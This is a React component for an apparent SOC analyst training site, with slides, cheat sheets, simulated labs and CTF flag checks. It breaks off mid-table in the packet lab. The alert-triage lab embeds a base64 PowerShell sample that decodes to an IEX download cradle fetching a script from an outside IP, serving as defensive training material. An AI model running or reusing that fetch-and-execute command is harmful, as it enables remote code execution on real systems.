import React, { useState, useEffect } from 'react';
import { useParams, useNavigate, Link } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Shield, Terminal, Tv, BookOpen, Flag, CheckCircle, Circle,
  ChevronRight, ChevronLeft, Search, Lock, Unlock, AlertTriangle,
  Award, Play, Copy, Check, Eye, HelpCircle, Activity, Cpu, Layers,
  RefreshCw, ExternalLink, Download, FileText, Send, Sparkles
} from 'lucide-react';
import { SOC_MODULES } from './data/socModulesData';
import './index.css';

const IconMap = {
  Shield: Shield,
  Activity: Activity,
  Cpu: Cpu,
  Layers: Layers,
  Flag: Flag,
  AlertTriangle: AlertTriangle
};

const SocCourse = () => {
  const { moduleId } = useParams();
  const navigate = useNavigate();

  // Find active module by id or slug (default to first module)
  const activeModuleIndex = Math.max(
    0,
    SOC_MODULES.findIndex(m => m.id === moduleId || m.slug === moduleId)
  );
  const activeModule = SOC_MODULES[activeModuleIndex] || SOC_MODULES[0];

  // State
  const [activeTab, setActiveTab] = useState('slides'); // 'slides' | 'theory' | 'lab' | 'challenge'
  const [currentSlideIndex, setCurrentSlideIndex] = useState(0);
  const [searchQuery, setSearchQuery] = useState('');
  const [copiedCode, setCopiedCode] = useState(null);

  // Completed challenges persisted in localStorage
  const [completedChallenges, setCompletedChallenges] = useState(() => {
    try {
      const saved = localStorage.getItem('moshii_soc_completed');
      return saved ? JSON.parse(saved) : {};
    } catch {
      return {};
    }
  });

  // Challenge input state per module
  const [flagInput, setFlagInput] = useState('');
  const [challengeStatus, setChallengeStatus] = useState(null); // 'success' | 'error' | null
  const [showHint, setShowHint] = useState(false);
  const [showCertificate, setShowCertificate] = useState(false);
  const [studentName, setStudentName] = useState('Cyber Defender');

  // Lab specific interactive states
  const [b64Input, setB64Input] = useState('');
  const [b64Decoded, setB64Decoded] = useState('');
  const [packetFilter, setPacketFilter] = useState('ALL');
  const [selectedAlert, setSelectedAlert] = useState(null);
  const [splunkQuery, setSplunkQuery] = useState('index=winsec | stats count by user, src_ip');
  const [sysmonFilter, setSysmonFilter] = useState('ALL');

  // Save completion state
  useEffect(() => {
    try {
      localStorage.setItem('moshii_soc_completed', JSON.stringify(completedChallenges));
    } catch (e) {
      console.error('Storage error:', e);
    }
  }, [completedChallenges]);

  // Reset slide index and inputs when module changes
  useEffect(() => {
    setCurrentSlideIndex(0);
    setFlagInput('');
    setChallengeStatus(null);
    setShowHint(false);
    setSelectedAlert(null);
    setB64Input('');
    setB64Decoded('');
  }, [activeModule.id]);

  // Keyboard navigation for slides
  useEffect(() => {
    const handleKeyDown = (e) => {
      if (activeTab !== 'slides') return;
      if (e.key === 'ArrowRight') nextSlide();
      if (e.key === 'ArrowLeft') prevSlide();
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [activeTab, currentSlideIndex, activeModule]);

  // Copy helper
  const handleCopy = (text, id) => {
    navigator.clipboard.writeText(text);
    setCopiedCode(id);
    setTimeout(() => setCopiedCode(null), 2000);
  };

  // Slide controls
  const totalSlides = activeModule.slides.length;
  const currentSlide = activeModule.slides[currentSlideIndex];

  const nextSlide = () => {
    if (currentSlideIndex < totalSlides - 1) {
      setCurrentSlideIndex(prev => prev + 1);
    }
  };

  const prevSlide = () => {
    if (currentSlideIndex > 0) {
      setCurrentSlideIndex(prev => prev - 1);
    }
  };

  // Flag submission handler
  const handleFlagSubmit = (e) => {
    e.preventDefault();
    const cleanInput = flagInput.trim();
    if (cleanInput === activeModule.challenge.flag || cleanInput === activeModule.challenge.targetKey) {
      setChallengeStatus('success');
      setCompletedChallenges(prev => ({
        ...prev,
        [activeModule.id]: true
      }));
    } else {
      setChallengeStatus('error');
      setTimeout(() => setChallengeStatus(null), 2000);
    }
  };

  // Stats calculation
  const totalModules = SOC_MODULES.length;
  const completedCount = Object.keys(completedChallenges).filter(k => completedChallenges[k]).length;
  const progressPercent = Math.round((completedCount / totalModules) * 100);
  const totalXP = completedCount * 100;

  // Filtered module list
  const filteredModules = SOC_MODULES.filter(m =>
    m.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
    m.category.toLowerCase().includes(searchQuery.toLowerCase()) ||
    m.summary.toLowerCase().includes(searchQuery.toLowerCase())
  );

  return (
    <div className="page-container soc-course-page" style={{ maxWidth: '1440px', margin: '0 auto', padding: '24px 16px' }}>
      
      {/* 1. Header Banner & Progress Command Bar */}
      <div className="glass-panel" style={{ marginBottom: '24px', borderLeft: '4px solid var(--accent-green)', position: 'relative', overflow: 'hidden' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '16px' }}>
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '8px' }}>
              <Shield className="text-glow-green" size={28} />
              <h2 className="text-glow-green" style={{ margin: 0, fontSize: 'clamp(1.4rem, 2.5vw, 1.9rem)' }}>
                SOC Analyst Master Pathway
              </h2>
            </div>
            <p style={{ margin: 0, color: 'var(--text-secondary)', fontSize: '0.95rem' }}>
              Defensive Operations · Interactive Slides · Live Telemetry Labs · Threat Hunting Challenges
            </p>
          </div>

          {/* XP & Certificate Button */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '16px', flexWrap: 'wrap' }}>
            <div style={{ textAlign: 'right' }}>
              <div style={{ fontFamily: 'var(--font-mono)', fontSize: '0.85rem', color: 'var(--text-secondary)' }}>
                TOTAL XP EARNED
              </div>
              <div style={{ fontFamily: 'var(--font-heading)', fontSize: '1.4rem', color: 'var(--accent-cyan)' }}>
                {totalXP} / {totalModules * 100} XP
              </div>
            </div>

            <button
              onClick={() => setShowCertificate(true)}
              className="hack-btn"
              style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                background: progressPercent === 100 ? 'rgba(0, 255, 65, 0.2)' : 'rgba(255, 255, 255, 0.05)',
                borderColor: progressPercent === 100 ? 'var(--accent-green)' : 'var(--glass-border)',
                color: progressPercent === 100 ? 'var(--accent-green)' : 'var(--text-secondary)'
              }}
            >
              <Award size={18} />
              {progressPercent === 100 ? 'View Certificate' : 'Certificate (Locked)'}
            </button>
          </div>
        </div>

        {/* Global Progress Bar */}
        <div style={{ marginTop: '20px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.8rem', fontFamily: 'var(--font-mono)', color: 'var(--text-secondary)', marginBottom: '6px' }}>
            <span>PROGRESS: {completedCount} OF {totalModules} MODULES CONQUERED</span>
            <span style={{ color: 'var(--accent-green)' }}>{progressPercent}% COMPLETE</span>
          </div>
          <div style={{ width: '100%', height: '8px', background: 'rgba(255,255,255,0.06)', borderRadius: '4px', overflow: 'hidden' }}>
            <motion.div
              style={{ height: '100%', background: 'linear-gradient(90deg, var(--accent-green), var(--accent-cyan))' }}
              initial={{ width: 0 }}
              animate={{ width: `${progressPercent}%` }}
              transition={{ duration: 0.8, ease: 'easeOut' }}
            />
          </div>
        </div>
      </div>

      {/* 2. Main Two-Pane Stage (Sidebar + Workspace) */}
      <div style={{ display: 'grid', gridTemplateColumns: 'minmax(280px, 340px) 1fr', gap: '24px', alignItems: 'start' }}>
        
        {/* Left Column: Module Navigation & Curriculum Tree */}
        <div className="glass-panel" style={{ padding: '16px', position: 'sticky', top: '90px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px', padding: '0 4px' }}>
            <Terminal size={18} color="var(--accent-cyan)" />
            <span style={{ fontFamily: 'var(--font-heading)', fontSize: '0.9rem', color: 'var(--text-primary)', letterSpacing: '1px' }}>
              COURSE MODULES
            </span>
          </div>

          {/* Search Modules Filter */}
          <div style={{ position: 'relative', marginBottom: '16px' }}>
            <input
              type="text"
              placeholder="Filter modules..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              style={{
                width: '100%',
                padding: '8px 12px 8px 34px',
                background: 'rgba(0,0,0,0.4)',
                border: '1px solid var(--glass-border)',
                borderRadius: '6px',
                color: 'var(--text-primary)',
                fontFamily: 'var(--font-mono)',
                fontSize: '0.82rem',
                outline: 'none'
              }}
            />
            <Search size={15} color="var(--text-secondary)" style={{ position: 'absolute', left: '10px', top: '10px' }} />
          </div>

          {/* Module List */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', maxHeight: 'calc(100vh - 280px)', overflowY: 'auto' }}>
            {filteredModules.map((m, idx) => {
              const isSelected = m.id === activeModule.id;
              const isCompleted = !!completedChallenges[m.id];
              const ModIcon = IconMap[m.icon] || Shield;

              return (
                <div
                  key={m.id}
                  onClick={() => navigate(`/soc/${m.slug}`)}
                  style={{
                    padding: '12px 14px',
                    borderRadius: '8px',
                    cursor: 'pointer',
                    transition: 'all 0.2s',
                    background: isSelected ? 'rgba(0, 255, 65, 0.12)' : 'rgba(0, 0, 0, 0.35)',
                    border: isSelected ? '1px solid var(--accent-green)' : '1px solid rgba(255, 255, 255, 0.05)',
                    position: 'relative'
                  }}
                >
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                    <span style={{ fontSize: '0.72rem', fontFamily: 'var(--font-mono)', color: isSelected ? 'var(--accent-green)' : 'var(--text-secondary)' }}>
                      STEP 0{idx + 1} · {m.category}
                    </span>
                    {isCompleted ? (
                      <span style={{ display: 'flex', alignItems: 'center', gap: '4px', fontSize: '0.72rem', color: 'var(--accent-green)', fontFamily: 'var(--font-mono)' }}>
                        <CheckCircle size={13} /> SOLVED
                      </span>
                    ) : (
                      <span style={{ display: 'flex', alignItems: 'center', gap: '4px', fontSize: '0.72rem', color: 'var(--text-secondary)', fontFamily: 'var(--font-mono)' }}>
                        <Circle size={13} /> PENDING
                      </span>
                    )}
                  </div>

                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <ModIcon size={16} color={isSelected ? 'var(--accent-green)' : 'var(--accent-cyan)'} />
                    <span style={{ fontWeight: 600, fontSize: '0.88rem', color: isSelected ? '#fff' : 'var(--text-primary)' }}>
                      {m.title.replace(/^Module \d+: /, '')}
                    </span>
                  </div>

                  <div style={{ display: 'flex', gap: '8px', marginTop: '6px', fontSize: '0.75rem', color: 'var(--text-secondary)', fontFamily: 'var(--font-mono)' }}>
                    <span>⏳ {m.duration}</span>
                    <span>•</span>
                    <span style={{ color: m.difficulty === 'Advanced' ? 'var(--accent-red)' : m.difficulty === 'Intermediate' ? 'var(--accent-cyan)' : 'var(--accent-green)' }}>
                      {m.difficulty}
                    </span>
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Right Column: Active Module Interactive Stage */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
          
          {/* Module Stage Top Bar & Tabs */}
          <div className="glass-panel" style={{ padding: '20px 24px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '16px', marginBottom: '16px' }}>
              <div>
                <div style={{ display: 'flex', gap: '8px', marginBottom: '8px', flexWrap: 'wrap' }}>
                  <span style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)', padding: '2px 8px', borderRadius: '4px', background: 'rgba(0, 255, 65, 0.15)', color: 'var(--accent-green)', border: '1px solid rgba(0, 255, 65, 0.3)' }}>
                    {activeModule.category}
                  </span>
                  <span style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)', padding: '2px 8px', borderRadius: '4px', background: 'rgba(0, 229, 255, 0.15)', color: 'var(--accent-cyan)', border: '1px solid rgba(0, 229, 255, 0.3)' }}>
                    {activeModule.duration}
                  </span>
                  <span style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)', padding: '2px 8px', borderRadius: '4px', background: 'rgba(181, 55, 242, 0.15)', color: 'var(--accent-purple)', border: '1px solid rgba(181, 55, 242, 0.3)' }}>
                    {activeModule.difficulty}
                  </span>
                </div>
                <h3 className="text-glow-cyan" style={{ margin: 0, fontSize: '1.4rem' }}>
                  {activeModule.title}
                </h3>
                <p style={{ margin: '6px 0 0 0', color: 'var(--text-secondary)', fontSize: '0.9rem' }}>
                  {activeModule.summary}
                </p>
              </div>

              {/* Status Badge */}
              {completedChallenges[activeModule.id] && (
                <div style={{ display: 'flex', alignItems: 'center', gap: '6px', background: 'rgba(0, 255, 65, 0.15)', border: '1px solid var(--accent-green)', color: 'var(--accent-green)', padding: '6px 12px', borderRadius: '20px', fontFamily: 'var(--font-mono)', fontSize: '0.8rem' }}>
                  <Sparkles size={16} /> Challenge Flag Captured! (+100 XP)
                </div>
              )}
            </div>

            {/* Mode Switcher Tabs (Slides | Theory | Lab | Challenge) */}
            <div style={{ display: 'flex', gap: '10px', borderTop: '1px solid var(--glass-border)', paddingTop: '16px', flexWrap: 'wrap' }}>
              {[
                { id: 'slides', label: '1. Presentation Slides', icon: Tv, badge: `${totalSlides} Slides` },
                { id: 'theory', label: '2. Theory & Cheat Sheets', icon: BookOpen },
                { id: 'lab', label: '3. Hands-On Lab', icon: Terminal, badge: 'Interactive' },
                { id: 'challenge', label: '4. CTF Challenge', icon: Flag, badge: completedChallenges[activeModule.id] ? 'Solved' : '+100 XP' }
              ].map(tab => {
                const TabIcon = tab.icon;
                const isCurrent = activeTab === tab.id;
                return (
                  <button
                    key={tab.id}
                    onClick={() => setActiveTab(tab.id)}
                    className="hack-btn"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      gap: '8px',
                      background: isCurrent ? 'rgba(0, 255, 65, 0.2)' : 'rgba(0,0,0,0.4)',
                      borderColor: isCurrent ? 'var(--accent-green)' : 'var(--glass-border)',
                      color: isCurrent ? '#fff' : 'var(--text-secondary)',
                      padding: '8px 16px',
                      fontSize: '0.85rem'
                    }}
                  >
                    <TabIcon size={16} color={isCurrent ? 'var(--accent-green)' : 'currentColor'} />
                    {tab.label}
                    {tab.badge && (
                      <span style={{
                        fontSize: '0.7rem',
                        padding: '1px 6px',
                        borderRadius: '10px',
                        background: isCurrent ? 'var(--accent-green)' : 'rgba(255,255,255,0.1)',
                        color: isCurrent ? '#000' : 'inherit',
                        fontWeight: 'bold'
                      }}>
                        {tab.badge}
                      </span>
                    )}
                  </button>
                );
              })}
            </div>
          </div>

          {/* TAB 1: PRESENTATION SLIDES VIEW */}
          {activeTab === 'slides' && (
            <motion.div
              key={`slides-${activeModule.id}-${currentSlideIndex}`}
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="glass-panel"
              style={{ padding: '32px', minHeight: '480px', display: 'flex', flexDirection: 'column', justifyContent: 'space-between' }}
            >
              <div>
                {/* Slide Header & Counter */}
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px', borderBottom: '1px solid var(--glass-border)', paddingBottom: '14px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                    <span style={{ fontFamily: 'var(--font-mono)', fontSize: '0.8rem', color: 'var(--accent-green)', background: 'rgba(0,255,65,0.1)', padding: '2px 8px', borderRadius: '4px' }}>
                      SLIDE {currentSlideIndex + 1} OF {totalSlides}
                    </span>
                    <span style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>
                      Use Left/Right arrow keys to navigate
                    </span>
                  </div>

                  {/* Dot pagination */}
                  <div style={{ display: 'flex', gap: '6px' }}>
                    {activeModule.slides.map((_, i) => (
                      <div
                        key={i}
                        onClick={() => setCurrentSlideIndex(i)}
                        style={{
                          width: i === currentSlideIndex ? '20px' : '8px',
                          height: '8px',
                          borderRadius: '4px',
                          background: i === currentSlideIndex ? 'var(--accent-green)' : 'rgba(255,255,255,0.2)',
                          cursor: 'pointer',
                          transition: 'all 0.3s'
                        }}
                      />
                    ))}
                  </div>
                </div>

                {/* Slide Title */}
                <h3 className="text-glow-green" style={{ fontSize: '1.6rem', marginBottom: '6px' }}>
                  {currentSlide.title}
                </h3>
                <h4 style={{ color: 'var(--accent-cyan)', fontSize: '1rem', fontWeight: 'normal', marginBottom: '24px' }}>
                  {currentSlide.subtitle}
                </h4>

                {/* Bullets */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '14px', marginBottom: '24px' }}>
                  {currentSlide.bullets.map((bullet, bIdx) => (
                    <div key={bIdx} style={{ display: 'flex', alignItems: 'flex-start', gap: '12px' }}>
                      <span style={{ color: 'var(--accent-green)', fontSize: '1.2rem', lineHeight: '1.4' }}>▸</span>
                      <p style={{ margin: 0, fontSize: '1rem', color: 'var(--text-primary)', lineHeight: '1.6' }}>
                        {bullet}
                      </p>
                    </div>
                  ))}
                </div>

                {/* Diagram / Visual Box */}
                {currentSlide.diagram && (
                  <div style={{
                    background: '#040711',
                    border: '1px solid var(--glass-border)',
                    borderRadius: '8px',
                    padding: '16px 20px',
                    fontFamily: 'var(--font-mono)',
                    fontSize: '0.85rem',
                    color: 'var(--accent-cyan)',
                    overflowX: 'auto',
                    whiteSpace: 'pre',
                    marginBottom: '24px'
                  }}>
                    {currentSlide.diagram.trim()}
                  </div>
                )}

                {/* Key Takeaway Callout */}
                {currentSlide.takeaway && (
                  <div style={{ padding: '12px 18px', background: 'rgba(0, 229, 255, 0.08)', borderLeft: '3px solid var(--accent-cyan)', borderRadius: '4px', fontSize: '0.9rem', color: 'var(--text-primary)' }}>
                    <strong style={{ color: 'var(--accent-cyan)' }}>KEY TAKEAWAY: </strong>
                    {currentSlide.takeaway}
                  </div>
                )}
              </div>

              {/* Slide Navigation Buttons Footer */}
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '32px', paddingTop: '16px', borderTop: '1px solid var(--glass-border)' }}>
                <button
                  onClick={prevSlide}
                  disabled={currentSlideIndex === 0}
                  className="hack-btn"
                  style={{
                    display: 'flex',
                    alignItems: 'center',
                    gap: '6px',
                    opacity: currentSlideIndex === 0 ? 0.4 : 1,
                    cursor: currentSlideIndex === 0 ? 'not-allowed' : 'pointer'
                  }}
                >
                  <ChevronLeft size={16} /> Previous Slide
                </button>

                <span style={{ fontFamily: 'var(--font-mono)', fontSize: '0.85rem', color: 'var(--text-secondary)' }}>
                  {currentSlideIndex + 1} / {totalSlides}
                </span>

                <button
                  onClick={nextSlide}
                  disabled={currentSlideIndex === totalSlides - 1}
                  className="hack-btn"
                  style={{
                    display: 'flex',
                    alignItems: 'center',
                    gap: '6px',
                    opacity: currentSlideIndex === totalSlides - 1 ? 0.4 : 1,
                    cursor: currentSlideIndex === totalSlides - 1 ? 'not-allowed' : 'pointer'
                  }}
                >
                  Next Slide <ChevronRight size={16} />
                </button>
              </div>
            </motion.div>
          )}

          {/* TAB 2: THEORY & CHEAT SHEETS VIEW */}
          {activeTab === 'theory' && (
            <motion.div
              key={`theory-${activeModule.id}`}
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className="glass-panel"
              style={{ padding: '32px' }}
            >
              <h3 className="text-glow-green" style={{ marginBottom: '16px' }}>
                📖 In-Depth Technical Guide & Cheat Sheet
              </h3>
              <p style={{ color: 'var(--text-secondary)', lineHeight: '1.7', marginBottom: '28px' }}>
                {activeModule.theory.overview}
              </p>

              {activeModule.theory.sections.map((sec, sIdx) => (
                <div key={sIdx} style={{ marginBottom: '32px' }}>
                  <h4 style={{ color: 'var(--accent-cyan)', fontSize: '1.15rem', marginBottom: '12px' }}>
                    {sec.heading}
                  </h4>
                  <p style={{ color: 'var(--text-primary)', lineHeight: '1.6', marginBottom: '16px' }}>
                    {sec.content}
                  </p>

                  {/* Steps List */}
                  {sec.steps && (
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginBottom: '20px' }}>
                      {sec.steps.map((st, stIdx) => (
                        <div key={stIdx} style={{ padding: '10px 14px', background: 'rgba(0,0,0,0.3)', borderLeft: '3px solid var(--accent-green)', borderRadius: '4px', fontSize: '0.9rem' }}>
                          {st}
                        </div>
                      ))}
                    </div>
                  )}

                  {/* Structured Table */}
                  {sec.table && (
                    <div style={{ overflowX: 'auto', marginBottom: '20px' }}>
                      <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.88rem' }}>
                        <thead>
                          <tr style={{ background: 'rgba(0, 229, 255, 0.1)', borderBottom: '1px solid var(--accent-cyan)' }}>
                            {sec.table.headers.map((h, hIdx) => (
                              <th key={hIdx} style={{ padding: '10px 14px', textAlign: 'left', color: 'var(--accent-cyan)', fontFamily: 'var(--font-heading)' }}>
                                {h}
                              </th>
                            ))}
                          </tr>
                        </thead>
                        <tbody>
                          {sec.table.rows.map((row, rIdx) => (
                            <tr key={rIdx} style={{ borderBottom: '1px solid rgba(255,255,255,0.05)', background: rIdx % 2 === 0 ? 'rgba(0,0,0,0.2)' : 'transparent' }}>
                              {row.map((cell, cIdx) => (
                                <td key={cIdx} style={{ padding: '10px 14px', color: 'var(--text-primary)' }}>
                                  {cell}
                                </td>
                              ))}
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  )}

                  {/* Code Block with Copy Button */}
                  {sec.codeBlock && (
                    <div style={{ position: 'relative', marginTop: '12px' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#030712', padding: '8px 14px', borderTopLeftRadius: '6px', borderTopRightRadius: '6px', border: '1px solid var(--glass-border)', borderBottom: 'none' }}>
                        <span style={{ fontSize: '0.75rem', fontFamily: 'var(--font-mono)', color: 'var(--accent-cyan)' }}>COMMAND REFERENCE</span>
                        <button
                          onClick={() => handleCopy(sec.codeBlock, `code-${sIdx}`)}
                          style={{ background: 'transparent', border: 'none', color: 'var(--text-secondary)', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '4px', fontSize: '0.75rem' }}
                        >
                          {copiedCode === `code-${sIdx}` ? <Check size={14} color="var(--accent-green)" /> : <Copy size={14} />}
                          {copiedCode === `code-${sIdx}` ? 'Copied' : 'Copy'}
                        </button>
                      </div>
                      <pre style={{ margin: 0, padding: '16px', background: '#050a18', border: '1px solid var(--glass-border)', borderBottomLeftRadius: '6px', borderBottomRightRadius: '6px', overflowX: 'auto', fontSize: '0.85rem', color: '#e2e8f0', fontFamily: 'var(--font-mono)' }}>
                        <code>{sec.codeBlock}</code>
                      </pre>
                    </div>
                  )}
                </div>
              ))}
            </motion.div>
          )}

          {/* TAB 3: INTERACTIVE HANDS-ON LAB */}
          {activeTab === 'lab' && (
            <motion.div
              key={`lab-${activeModule.id}`}
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className="glass-panel"
              style={{ padding: '32px' }}
            >
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', flexWrap: 'wrap', gap: '12px' }}>
                <h3 className="text-glow-green" style={{ margin: 0, display: 'flex', alignItems: 'center', gap: '10px' }}>
                  <Terminal size={22} /> {activeModule.lab.title}
                </h3>
                <span style={{ fontSize: '0.8rem', fontFamily: 'var(--font-mono)', color: 'var(--accent-cyan)', background: 'rgba(0,229,255,0.1)', padding: '4px 10px', borderRadius: '4px' }}>
                  SIMULATED SANDBOX ACTIVE
                </span>
              </div>

              <div style={{ padding: '14px 18px', background: 'rgba(0,0,0,0.5)', borderLeft: '3px solid var(--accent-cyan)', borderRadius: '6px', marginBottom: '24px' }}>
                <strong>MISSION SCENARIO:</strong> {activeModule.lab.scenario}
              </div>

              {/* LAB ENVIRONMENT 1: ALERT TRIAGE SIMULATOR (Module 1) */}
              {activeModule.lab.type === 'alert-triage-sim' && (
                <div>
                  <h4 style={{ color: 'var(--accent-cyan)', fontSize: '0.95rem', marginBottom: '12px' }}>
                    SIEM QUEUE: CLICK AN ALERT TO INSPECT PAYLOAD & TRIAGE
                  </h4>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', marginBottom: '24px' }}>
                    {activeModule.lab.alerts.map(al => (
                      <div
                        key={al.id}
                        onClick={() => setSelectedAlert(al)}
                        style={{
                          padding: '12px 16px',
                          borderRadius: '6px',
                          background: selectedAlert?.id === al.id ? 'rgba(0,229,255,0.12)' : 'rgba(0,0,0,0.4)',
                          border: selectedAlert?.id === al.id ? '1px solid var(--accent-cyan)' : '1px solid var(--glass-border)',
                          cursor: 'pointer',
                          display: 'flex',
                          justifyContent: 'space-between',
                          alignItems: 'center',
                          flexWrap: 'wrap',
                          gap: '8px'
                        }}
                      >
                        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                          <span style={{
                            padding: '2px 8px',
                            borderRadius: '4px',
                            fontSize: '0.75rem',
                            fontWeight: 'bold',
                            fontFamily: 'var(--font-mono)',
                            background: al.severity === 'CRITICAL' ? 'rgba(255,0,60,0.2)' : al.severity === 'HIGH' ? 'rgba(255,165,0,0.2)' : 'rgba(0,255,65,0.2)',
                            color: al.severity === 'CRITICAL' ? 'var(--accent-red)' : al.severity === 'HIGH' ? 'orange' : 'var(--accent-green)'
                          }}>
                            {al.severity}
                          </span>
                          <strong style={{ fontSize: '0.9rem' }}>{al.rule}</strong>
                        </div>
                        <span style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', fontFamily: 'var(--font-mono)' }}>
                          {al.host} · {al.timestamp}
                        </span>
                      </div>
                    ))}
                  </div>

                  {/* Selected Alert Detailed Drawer */}
                  {selectedAlert && (
                    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} style={{ padding: '20px', background: '#040714', border: '1px solid var(--accent-cyan)', borderRadius: '8px', marginBottom: '24px' }}>
                      <h4 style={{ color: 'var(--accent-cyan)', marginTop: 0 }}>Incident Details: {selectedAlert.id} - {selectedAlert.rule}</h4>
                      <p style={{ fontSize: '0.85rem', color: 'var(--text-secondary)' }}>Target Host: <code>{selectedAlert.host}</code> | Compromised User: <code>{selectedAlert.user}</code></p>
                      <div style={{ background: '#020308', padding: '12px', borderRadius: '4px', fontFamily: 'var(--font-mono)', fontSize: '0.82rem', color: '#e2e8f0', wordBreak: 'break-all', marginBottom: '16px' }}>
                        {selectedAlert.details}
                      </div>

                      {/* Built-in Base64 Quick Decoder Tool */}
                      {selectedAlert.details.includes('-Enc') && (
                        <div style={{ marginTop: '14px', padding: '14px', background: 'rgba(0, 255, 65, 0.05)', border: '1px solid var(--accent-green)', borderRadius: '6px' }}>
                          <strong style={{ color: 'var(--accent-green)', fontSize: '0.85rem' }}>🛠️ ANALYST DECODER TOOL (UTF-16LE Base64)</strong>
                          <div style={{ display: 'flex', gap: '8px', marginTop: '8px' }}>
                            <button
                              onClick={() => {
                                try {
                                  const b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADkANQAuADIAMAAxAC4AMQAwAC4AMQA0ADoAOAAwADgAMAAvAG0AYQB0AHIAaQB4AC4AcABzADEAIgApAA==";
                                  const binary = atob(b64);
                                  let res = '';
                                  for (let i = 0; i < binary.length; i += 2) {
                                    res += binary[i];
                                  }
                                  setB64Decoded(res);
                                } catch (e) {
                                  setB64Decoded('Decode failed');
                                }
                              }}
                              className="hack-btn"
                              style={{ padding: '6px 14px', fontSize: '0.8rem' }}
                            >
                              Auto-Decode EncodedCommand Payload
                            </button>
                          </div>
                          {b64Decoded && (
                            <pre style={{ marginTop: '10px', padding: '10px', background: '#000', color: 'var(--accent-green)', borderRadius: '4px', fontSize: '0.85rem', fontFamily: 'var(--font-mono)' }}>
                              {b64Decoded}
                            </pre>
                          )}
                        </div>
                      )}
                    </motion.div>
                  )}
                </div>
              )}

              {/* LAB ENVIRONMENT 2: WIRESHARK PACKET INSPECTOR (Module 2) */}
              {activeModule.lab.type === 'network-packet-sim' && (
                <div>
                  {/* Filter Toolbar */}
                  <div style={{ display: 'flex', gap: '8px', alignItems: 'center', marginBottom: '14px' }}>
                    <span style={{ fontSize: '0.8rem', fontFamily: 'var(--font-mono)', color: 'var(--text-secondary)' }}>FILTER:</span>
                    {['ALL', 'DNS', 'ARP'].map(flt => (
                      <button
                        key={flt}
                        onClick={() => setPacketFilter(flt)}
                        style={{
                          padding: '4px 10px',
                          borderRadius: '4px',
                          border: packetFilter === flt ? '1px solid var(--accent-cyan)' : '1px solid var(--glass-border)',
                          background: packetFilter === flt ? 'rgba(0,229,255,0.2)' : 'transparent',
                          color: packetFilter === flt ? 'var(--accent-cyan)' : 'var(--text-secondary)',
                          fontSize: '0.75rem',
                          fontFamily: 'var(--font-mono)',
                          cursor: 'pointer'
                        }}
                      >
                        {flt}
                      </button>
                    ))}
                  </div>

                  {/* Packet Table */}
                  <div style={{ overflowX: 'auto', background: '#020308', borderRadius: '6px', border: '1px solid var(--glass-border)', marginBottom: '20px' }}>
                    <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.82rem', fontFamily: 'var(--font-mono)' }}>
                      <thead>
                        <tr style={{ background: '#090e1a', color: 'var(--accent-cyan)', borderBottom: '1px solid var(--glass-border)' }}>
                          <th style={{ padding: '8px 12px', textAlign: 'left' }}>No.</th>
                          <th style={{ padding: '8px 12px', textAlign: 'left' }}>Time</th>
                          <th style={{ padding: '8px 12px', textAlign: 'left' }}>Source</th>
                          <th style={{ padding: '8px 12px', textAlign: 'left' }}>Destination</th>
                          <th style={{ padding: '8px 12px', textAlign: 'left' }}>Protocol</th>
                          <th style={{ padding: '8px 12px', textAlign: 'left' }}>Info</th>
                        </tr>
                      </thead>
                      <tbody>
                        {activeModule.lab.packets
                          .filter(p => packetFilter === 'ALL' || p.proto === packetFilter)
                          .map(pkt => (
                            <tr key={pkt.no} style={{ borderBottom: '1px solid rgba(255,255,255,0.04)', color: pkt.proto === 'DNS' ? '#67e8f9' : '#cbd5e1' }}>
